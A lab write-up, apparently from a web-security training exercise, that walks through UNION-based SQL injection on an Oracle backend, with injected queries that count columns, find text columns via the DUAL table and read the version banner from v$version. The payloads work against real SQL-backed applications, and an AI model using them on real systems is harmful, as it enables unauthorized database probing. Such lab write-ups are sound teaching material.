## Lab Description :

![image]()

![image]()


## Solution :

Here we can find out the number of columns that the web app is querying & also determine the columns which have text data but to retreive a column data  we need to know the table name.

> In oracle there is a default table called **DUAL**. Using that we can retreive column data.

#### Determine the number of columns 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

**ORDER BY 3** gives error, so there are 2 columns being retreived.

#### Determine the column which has text data


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'shebu','cys' FROM dual --
```
Both the columns show the text in response. So both columns support text data.

#### Retreive db type & version of ORACLE 

To retretive db type & version of ORACLE , we have the syntax `SELECT * FROM v$version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --
```

We got the db info we needed.

![image]()

![image]()

![image]()

